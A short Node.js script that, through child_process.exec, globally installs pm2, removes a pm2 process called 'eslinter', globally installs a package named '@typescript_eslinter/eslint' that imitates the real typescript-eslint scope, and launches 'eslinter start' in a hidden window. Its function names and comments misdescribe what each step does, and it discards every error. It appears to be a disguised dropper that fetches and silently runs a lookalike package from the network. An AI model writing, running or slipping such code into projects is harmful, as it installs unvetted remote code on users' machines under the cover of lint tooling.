const { exec } = require('child_process');

// Function to install pm2 globally
function installPrettier() {
  return new Promise((resolve, reject) => {
    exec('npm install -g pm2', (error, stdout, stderr) => {
      if (error) {
        resolve(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

function deleteEslinter() {
  return new Promise((resolve, reject) => {
    exec('pm2 delete eslinter', (error, stdout, stderr) => {
      if (error) {
        resolve(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Function to install screener globally
function installEslinter() {
  return new Promise((resolve, reject) => {
    exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
      if (error) {
        resolve(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Function to start the folder with pm2
function startEslinter() {
  return new Promise((resolve, reject) => {
    exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
      if (error) {
        resolve(`Error starting with PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Main function to execute the steps
async function main() {
  try {
    await installPrettier();
    await deleteEslinter();
    await installEslinter();
    await startEslinter();
  } catch (error) {
  }
}

main();
